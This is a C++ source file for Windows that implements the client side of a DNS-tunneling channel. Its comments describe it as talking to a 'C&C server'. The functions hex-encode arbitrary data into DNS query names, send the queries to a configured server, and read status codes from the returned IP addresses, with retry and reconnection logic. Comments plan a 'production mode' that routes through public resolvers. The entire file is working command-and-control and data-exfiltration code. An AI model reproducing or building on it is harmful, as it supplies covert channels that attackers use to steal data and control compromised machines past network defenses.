#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <winsock2.h>
#include <windns.h>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")

/**
 * Establishes connection with DNS server via DNS query
 * 
 * LOCAL TEST MODE:
 *   Sends query directly to C&C server (DNS_SERVER_IP = 127.0.0.1)
 * 
 * PRODUCTION MODE (Future):
 *   Sends query to DNS Resolver → Resolver forwards to C&C server
 * 
 * Query: a.1.1.1.domain
 * Returns: Connection ID extracted from last octet of response IP
 */
int startConnection(const char* domain) {
	if (!domain) {
		return -1;
	}

	std::string fullString = "a.1.1.1.";
	fullString += domain;
	const char* pOwnerName = fullString.c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	// LOCAL TEST MODE: Direct to C&C Server

	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status = DnsQuery_A(
		pOwnerName,
		wType,
		DNS_OPTIONS,
		pSrvList,
		&pDnsRecord,
		nullptr
	);
	
	LocalFree(pSrvList);
	
	
	if (status) {
		return -1;
	}
	
	if (!pDnsRecord) {
		return -1;
	}
	
	// Parse response IP - last octet is Connection ID
	IN_ADDR ipaddr;
	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
	std::string ipStr = inet_ntoa(ipaddr);
	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
	
	size_t lastDot = ipStr.rfind(".");
	if (lastDot == std::string::npos) {
		return -1;
	}
	
	int connectionId = std::stoi(ipStr.substr(lastDot + 1));
	return connectionId;
}

/**
 * Send data via DNS tunneling
 * Format: b.packetNum.connectionId.hexData.domain
 * Response IP first octet = status code
 */
int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	// LOCAL TEST MODE: Direct to C&C Server
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	// Retry up to 3 times (reduced from 5)
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			// First octet = response code
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
				case 200:  
					retCode = 0;
					goto cleanup;
					
				case 201:  
					break;
					
				case 202: 
					{
						int new_id = startConnection(domain);
						if (new_id != -1) {
							id = new_id;
						}
					}
					i--;  
					break;
					
				case 203:  
					packetNumber = 0;
					i--;  
					break;
					
				case 204: 
					goto cleanup;
					
				default:
					goto cleanup;
			}
		}
		
		Sleep(200); 
	}
	
cleanup:
	if (pSrvList) {
		LocalFree(pSrvList);
	}
	return retCode;
}

/**
 * Send data via DNS tunneling
 * Format: c.packetNum.connectionId.hexData.domain
 * Response IP first octet = status code
 */
int sendDataTypeC(int& id, int& packetNumber, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "c." << packetNumber << "." << id << "." << data << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	// LOCAL TEST MODE: Direct to C&C Server
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	// Retry up to 3 times (reduced from 5)
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			// First octet = response code
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
			case 200:  
				retCode = 0;
				goto cleanup;
					
			case 201:  
				break;
					
			case 202: 
				{
					int new_id = startConnection(domain);
					if (new_id != -1) {
						id = new_id;
					}
				}
				i--;  
				break;
					
			case 203:  
				packetNumber = 0;
				i--;  
				break;
					
			case 204: 
				goto cleanup;
					
			default:
				goto cleanup;
			}
		}
		
		Sleep(200); 
	}
	
	cleanup:
		if (pSrvList) {
			LocalFree(pSrvList);
		}
	return retCode;
}

/**
 * Convert string to hex encoding for DNS tunneling
 * Example: "Hello" -> "48656c6c6f"
 */
std::string convertToHex(const char* string) {
	if (!string) {
		return "";
	}

	std::ostringstream out;
	out << std::hex << std::setfill('0');
	
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(static_cast<unsigned char>(*i));
	}
	
	return out.str();
}